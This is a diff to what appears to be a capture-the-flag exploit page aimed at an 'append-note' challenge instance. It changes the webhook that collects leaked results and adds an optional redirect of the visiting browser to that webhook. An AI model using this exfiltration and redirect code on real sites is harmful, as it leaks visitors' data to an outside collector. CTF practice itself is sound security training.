@@ -18,7 +18,8 @@ body { background: #0d1117; color: #c9d1d9; font-family: monospace; padding: 16p
 
 <script>
 const TARGET = "https://append-note-3npey.instancer.lac.tf";
-const WEBHOOK = "https://careful-comet-22.webhook.cool";
+const WEBHOOK = "https://webhook.site/466ebd1a-c20e-4b2b-b4d4-8f513148e815";
+const DEBUG_REDIRECT = false;
 const CHARS = "0123456789abcdef";
 
 const PROBE_TIMEOUT_MS = 420;
@@ -183,6 +184,11 @@ async function main() {
     report("BOOT");
     report("BOOT");
     report("BOOT");
+    if (DEBUG_REDIRECT) {
+        setTimeout(() => {
+            try { window.location.href = WEBHOOK + "?boot=1&t=" + Date.now(); } catch (e) {}
+        }, 2500);
+    }
     setInterval(() => report("HB"), 5000);
     log(`Target: ${TARGET}`);
     log(`Webhook: ${WEBHOOK}`);
